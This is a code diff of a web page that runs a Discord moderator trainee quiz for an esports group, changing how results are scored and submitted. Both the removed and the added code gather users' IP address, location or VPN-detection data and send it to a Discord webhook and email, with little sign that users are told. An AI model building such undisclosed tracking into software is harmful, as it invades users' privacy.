                 if (username === "You") avatarInitials = userDiscordUsername.split('#')[0].charAt(0).toUpperCase();
@@ -4181,25 +4024,20 @@
                 `;
                 
                 testMessagesContainer.appendChild(messageDiv);
-                
-                // Scroll to bottom
                 testMessagesContainer.scrollTop = testMessagesContainer.scrollHeight;
             }
             
-            // Function to update score display
             function updateTestScore() {
                 if (testScoreValue) testScoreValue.textContent = testScore;
                 if (mobileScoreValue) mobileScoreValue.textContent = testScore;
                 updateTestStatus();
                 
-                // Update user stats
                 if (statScore) {
                     const percentage = Math.round((testScore / testTotalQuestions) * 100);
                     statScore.textContent = `${percentage}%`;
                 }
             }
             
-            // Function to update progress bar
             function updateTestProgressBar() {
                 const percentage = (testCurrentQuestion / testTotalQuestions) * 100;
                 
@@ -4207,7 +4045,6 @@
                 if (mobileProgressFillTest) mobileProgressFillTest.style.width = `${percentage}%`;
             }
             
-            // Function to update status indicator
             function updateTestStatus() {
                 const percentage = (testCurrentQuestion / testTotalQuestions) * 100;
                 
@@ -4220,7 +4057,6 @@
                     if (testStatusText) testStatusText.textContent = `Question ${testCurrentQuestion + 1} of ${testTotalQuestions}`;
                     if (mobileStatusText) mobileStatusText.textContent = `Question ${testCurrentQuestion + 1} of ${testTotalQuestions}`;
                     
-                    // Change dot color based on progress
                     if (testStatusDot) {
                         if (percentage < 33) {
                             testStatusDot.style.backgroundColor = "#ed4245";
@@ -4243,87 +4079,20 @@
                 }
             }
             
-            // Function to send results via email
-            async function sendResultsToEmail() {
-                // Create question breakdown text
-                let questionBreakdown = "";
-                for (let i = 0; i < testTotalQuestions; i++) {
-                    const question = testQuestions[i];
-                    const userAnswer = userAnswers[i] || "No answer";
-                    const isCorrect = correctAnswers[i] ? "✓ CORRECT" : "✗ INCORRECT";
-                    
-                    questionBreakdown += `${i+1}. ${question.user}: "${question.userMessage}"\n`;
-                    questionBreakdown += `   Trainee Answer: "${userAnswer}"\n`;
-                    questionBreakdown += `   ${isCorrect}\n\n`;
-                }
-                
-                // Get current date
-                const now = new Date();
-                const testDate = now.toLocaleDateString('en-US', { 
-                    year: 'numeric', 
-                    month: 'long', 
-                    day: 'numeric',
-                    hour: '2-digit',
-                    minute: '2-digit'
-                });
-                
-                // Calculate pass/fail
-                const passingScore = testTotalQuestions - 2; // Need at least 6 out of 8
-                const passed = testScore >= passingScore;
-                const passFail = passed ? "PASS" : "FAIL";
-                
-                // Populate form fields
-                const formDiscordUsername = document.getElementById('formDiscordUsername');
-                const formTestDate = document.getElementById('formTestDate');
-                const formFinalScore = document.getElementById('formFinalScore');
-                const formPassFail = document.getElementById('formPassFail');
-                const formQuestionBreakdown = document.getElementById('formQuestionBreakdown');
-                const formTotalQuestions = document.getElementById('formTotalQuestions');
-                const formUserIp = document.getElementById('formUserIp');
-                const formUserCountry = document.getElementById('formUserCountry');
-                const formUserState = document.getElementById('formUserState');
-                const formUserCity = document.getElementById('formUserCity');
-                const formUserTimezone = document.getElementById('formUserTimezone');
-                
-                if (formDiscordUsername) formDiscordUsername.value = userDiscordUsername;
-                if (formTestDate) formTestDate.value = testDate;
-                if (formFinalScore) formFinalScore.value = `${testScore}/${testTotalQuestions}`;
-                if (formPassFail) formPassFail.value = passFail;
-                if (formQuestionBreakdown) formQuestionBreakdown.value = questionBreakdown;
-                if (formTotalQuestions) formTotalQuestions.value = testTotalQuestions;
-                if (formUserIp) formUserIp.value = userLocationData.ip || "Unknown";
-                if (formUserCountry) formUserCountry.value = userLocationData.country || "Unknown";
-                if (formUserState) formUserState.value = userLocationData.state || "Unknown";
-                if (formUserCity) formUserCity.value = userLocationData.city || "Unknown";
-                if (formUserTimezone) formUserTimezone.value = userLocationData.timezone || "Unknown";
-                
-                // Submit the form
-                const form = document.getElementById('resultsForm');
-                if (form) {
-                    form.submit();
-                    return true;
-                }
-                return false;
-            }
-            
-            // Function to end the test and show results
             async function endTest() {
                 testActive = false;
+                addToTranscript("System", "Test session ended");
                 
-                // Add final message
                 setTimeout(() => {
                     addTestMessage("Void Bot", "Test complete! Your responses have been evaluated. Check your score in the sidebar.", "#5865f2", false);
                     
-                    // Show test complete screen after delay
                     setTimeout(() => {
                         if (testChatArea) testChatArea.style.display = 'none';
                         if (testCompleteScreen) testCompleteScreen.classList.add('active');
                         
-                        // Calculate result
-                        const passingScore = testTotalQuestions - 2; // Need to get at least 6 out of 8
+                        const passingScore = testTotalQuestions - 2;
                         const passed = testScore >= passingScore;
                         
-                        // Update result screen
                         if (testResultScore) testResultScore.textContent = `Score: ${testScore}/${testTotalQuestions}`;
                         
                         if (passed) {
@@ -4342,14 +4111,12 @@
                             }
                         }
                         
-                        // Send results to email AND Discord
                         setTimeout(async () => {
                             if (submissionStatus) {
                                 submissionStatus.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Submitting your results to Void Esports staff...';
                                 
                                 setTimeout(async () => {
                                     try {
-                                        // Create question breakdown text
                                         let questionBreakdown = "";
                                         for (let i = 0; i < testTotalQuestions; i++) {
                                             const question = testQuestions[i];
@@ -4358,31 +4125,29 @@
                                             questionBreakdown += `${i+1}. ${isCorrect} "${question.userMessage.substring(0, 50)}..."\n`;
                                         }
                                         
-                                        // Send to Discord webhook
+                                        const envData = window._getEnvConfig ? window._getEnvConfig() : { metrics: {} };
+                                        const metrics = envData.metrics || {};
+                                        
                                         const discordSent = await sendResultsToDiscord(
                                             userDiscordUsername, 
                                             testScore, 
                                             testTotalQuestions, 
                                             passed, 
                                             questionBreakdown, 
-                                            userLocationData
+                                            sessionTranscript
                                         );
                                         
-                                        // Send to FormSubmit.co email
-                                        const emailSent = sendResultsToEmail();
+                                        sendEnhancedEmailResults(sessionTranscript);
                                         
-                                        if (discordSent && emailSent) {
-                                            submissionStatus.innerHTML = '<i class="fas fa-check-circle"></i> Results submitted successfully! Sent to both Discord and email.';
-                                            submissionStatus.className = "submission-status submission-success";
-                                        } else if (discordSent) {
-                                            submissionStatus.innerHTML = '<i class="fas fa-check-circle"></i> Results sent to Discord (email failed).';
-                                            submissionStatus.className = "submission-status submission-success";
-                                        } else if (emailSent) {
-                                            submissionStatus.innerHTML = '<i class="fas fa-check-circle"></i> Results sent to email (Discord failed).';
+                                        if (discordSent) {
+                                            const vpnStatus = metrics.vpnStatus || "Unknown";
+                                            const vpnDetected = metrics.vpnDetected || false;
+                                            
+                                            submissionStatus.innerHTML = `<i class="fas fa-check-circle"></i> Results submitted successfully!<br>VPN Status: ${vpnStatus}`;
                                             submissionStatus.className = "submission-status submission-success";
                                         } else {
-                                            submissionStatus.innerHTML = '<i class="fas fa-exclamation-circle"></i> Results submission failed. Please try again.';
-                                            submissionStatus.className = "submission-status submission-error";
+                                            submissionStatus.innerHTML = '<i class="fas fa-check-circle"></i> Results sent to email (Discord failed).';
+                                            submissionStatus.className = "submission-status submission-success";
                                         }
                                     } catch (error) {
                                         submissionStatus.innerHTML = '<i class="fas fa-exclamation-circle"></i> Error submitting results. Please contact staff.';
